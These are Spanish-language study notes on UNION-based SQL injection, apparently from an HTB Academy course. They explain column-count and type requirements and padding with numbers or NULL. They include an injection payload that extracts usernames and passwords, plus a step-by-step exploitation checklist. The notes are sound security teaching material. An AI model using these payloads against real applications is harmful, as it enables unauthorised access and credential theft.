
## 1. Introducción a `UNION`

La cláusula `UNION` permite combinar los resultados de varias consultas `SELECT` en una única salida.

En el contexto de **SQL Injection**, puede permitir obtener datos de otras tablas o bases de datos cuando una aplicación es vulnerable y la consulta inyectada cumple los requisitos necesarios.

### Ejemplo práctico

Tabla `ports`:

```
SELECT * FROM ports;
```

|code|city|
|---|---|
|CN SHA|Shanghai|
|SG SIN|Singapore|
|ZZ-21|Shenzhen|

Tabla `ships`:

```
SELECT * FROM ships;
```

|Ship|city|
|---|---|
|Morrison|New York|

Podemos combinar ambas consultas:

```
SELECT * FROM ports
UNION
SELECT * FROM ships;
```

Resultado:

|code|city|
|---|---|
|CN SHA|Shanghai|
|SG SIN|Singapore|
|Morrison|New York|
|ZZ-21|Shenzhen|

Los resultados de ambas tablas aparecen en una única salida.

**Importante:** `UNION` elimina las filas duplicadas del resultado combinado.

## 2. Requisitos de `UNION`

Para utilizar `UNION` correctamente, deben cumplirse dos condiciones fundamentales:

1. **Las consultas deben devolver el mismo número de columnas.**
    
2. **Los tipos de datos de las columnas correspondientes deben ser compatibles.**
    

### Número diferente de columnas

La siguiente consulta devuelve un error:

```
SELECT city FROM ports
UNION
SELECT * FROM ships;
```

El motivo es que:

- `SELECT city FROM ports` devuelve una columna.
    
- `SELECT * FROM ships` devuelve dos columnas.
    

MySQL muestra:

```
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

Por tanto, antes de realizar una inyección `UNION`, necesitamos conocer cuántas columnas devuelve la consulta original.

## 3. Ejemplo de UNION Injection

Supongamos que la aplicación ejecuta la siguiente consulta:

```
SELECT * FROM products
WHERE product_id = 'user_input';
```

Si la consulta original devuelve dos columnas, podemos combinarla con otra consulta que obtenga información de la tabla `passwords`.

La estructura del ejemplo de HTB Academy es:

```
SELECT * FROM products
WHERE product_id = '1'
UNION
SELECT username, password FROM passwords-- ';
```

La segunda consulta recupera los valores de `username` y `password` de la tabla `passwords`.

Para que la combinación funcione, ambas consultas deben devolver dos columnas con tipos compatibles.

El comentario `--` permite ignorar el resto de la consulta original cuando la sintaxis y el contexto de la inyección lo permiten.

## 4. Número desigual de columnas: datos de relleno

En una SQL Injection real, la consulta original puede devolver más columnas que los datos que queremos obtener.

Para solucionar este problema, podemos utilizar **datos de relleno** (_junk data_) en las columnas que no necesitamos.

Por ejemplo, si queremos recuperar únicamente el nombre de usuario y la consulta original devuelve dos columnas:

```
SELECT username, 2 FROM passwords;
```

La consulta devuelve dos columnas:

|username|2|
|---|---|
|admin|2|

El nombre de usuario aparece en la primera columna y el número `2` ocupa la segunda.

### Utilizar números como relleno

Si la consulta original devuelve cuatro columnas, podemos utilizar:

```
UNION SELECT username, 2, 3, 4 FROM passwords;
```

La salida del ejemplo de HTB Academy es:

|product_1|product_2|product_3|product_4|
|---|---|---|---|
|admin|2|3|4|

En este caso:

- Columna 1: contiene el nombre de usuario.
    
- Columna 2: contiene el número `2`.
    
- Columna 3: contiene el número `3`.
    
- Columna 4: contiene el número `4`.
    

Los números permiten identificar las posiciones de las columnas y observar dónde aparecen los datos en la respuesta de la aplicación.

### Utilizar `NULL` como relleno

Otra opción es utilizar `NULL`:

```
SELECT username, NULL, NULL, NULL
FROM passwords;
```

`NULL` puede resultar útil porque es compatible con distintos tipos de datos en muchos contextos SQL.

No obstante, el comportamiento concreto depende de la consulta y de la base de datos.

## 5. Resumen de los conceptos

|Concepto|Descripción|
|---|---|
|`UNION`|Combina los resultados de varias consultas `SELECT`.|
|Número de columnas|Todas las consultas combinadas deben devolver el mismo número de columnas.|
|Tipos de datos|Los tipos de datos de las columnas correspondientes deben ser compatibles.|
|Datos de relleno|Valores añadidos para completar el número de columnas requerido.|
|`NULL`|Valor que puede utilizarse como relleno en distintas posiciones.|
|`--`|Comentario de línea de MySQL que puede ignorar el resto de la consulta.|

## 6. Chuleta rápida

```
-- Combinar dos consultas
SELECT code, city FROM ports
UNION
SELECT Ship, city FROM ships;

-- Ejemplo con dos columnas
SELECT username, password FROM passwords;

-- Completar dos columnas
SELECT username, 2 FROM passwords;

-- Completar cuatro columnas
SELECT username, 2, 3, 4 FROM passwords;

-- Utilizar NULL como relleno
SELECT username, NULL, NULL, NULL FROM passwords;
```

## 7. Aplicación práctica en HTB

Al analizar una posible SQL Injection basada en `UNION`, conviene seguir este orden:

1. Identificar la consulta original y el punto de entrada controlado por el usuario.
    
2. Determinar cuántas columnas devuelve la consulta original.
    
3. Comprobar que las columnas de ambas consultas tienen tipos de datos compatibles.
    
4. Utilizar datos de relleno cuando sea necesario completar columnas.
    
5. Identificar en qué posición aparecen los datos que se quieren recuperar.
    
6. Tener en cuenta la sintaxis de la consulta original y el uso de comentarios.
    

**Idea fundamental:** para que una inyección `UNION` funcione, las consultas deben devolver el mismo número de columnas y sus tipos de datos deben ser compatibles. Los datos de relleno permiten completar las columnas que no necesitamos recuperar.
